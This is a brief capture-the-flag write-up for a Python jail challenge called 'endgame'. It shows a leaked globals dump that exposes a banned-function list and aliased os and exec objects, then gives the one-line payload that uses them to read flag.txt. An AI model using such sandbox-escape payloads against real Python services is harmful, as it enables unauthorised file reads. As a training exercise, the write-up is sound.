<!DOCTYPE html>
<html lang="en">
	<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<title>RiceSec</title>

	<link href="/writeups/css/prism-one-light.css" rel="stylesheet" />
	<link rel="stylesheet" href="/writeups/css/style.css" />
</head>


	<body>
		
<header>
	<nav>
		<b>RiceSec</b>
	</nav>
</header>

<h1>endgame</h1>

<p>From level 1, we have:</p>
<blockquote>
<p>Word of advice,remember this:weYbdk9012ghiwh=0?</p>
</blockquote>
<p>Entering <code>weYbdk9012ghiwh=0?</code> as the helpline id in <code>3. Use helpline</code> gives:</p>
<pre class="language-py"><code class="language-py"><span class="token punctuation">{</span><span class="token string">'__name__'</span><span class="token punctuation">:</span> <span class="token string">'__main__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'__loader__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>_frozen_importlib_external<span class="token punctuation">.</span>SourceFileLoader <span class="token builtin">object</span> at <span class="token number">0x7f72267e4f10</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'__annotations__'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>module <span class="token string">'builtins'</span> <span class="token punctuation">(</span>built<span class="token operator">-</span><span class="token keyword">in</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__file__'</span><span class="token punctuation">:</span> <span class="token string">'/endgame.py'</span><span class="token punctuation">,</span> <span class="token string">'__cached__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'banned'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'import'</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token keyword">print</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token keyword">exec</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">eval</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">open</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">globals</span><span class="token operator">></span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'sos'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>module <span class="token string">'os'</span> <span class="token keyword">from</span> <span class="token string">'/usr/lib/python3.8/os.py'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'beat_the_master'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token keyword">exec</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'main'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>function main at <span class="token number">0x7f72266dde50</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'escape'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>function escape at <span class="token number">0x7f72266ddee0</span><span class="token operator">></span><span class="token punctuation">}</span></code></pre>
<p>This, then, gets the flag:</p>
<pre class="language-py"><code class="language-py">beat_the_master<span class="token punctuation">(</span><span class="token string">'print(sos.read(sos.open("./flag.txt", sos.O_RDONLY), 100))'</span><span class="token punctuation">)</span></code></pre>
<p>(I lost my original payload, but it was a little simpler than this one.)</p>



	</body>
</html>
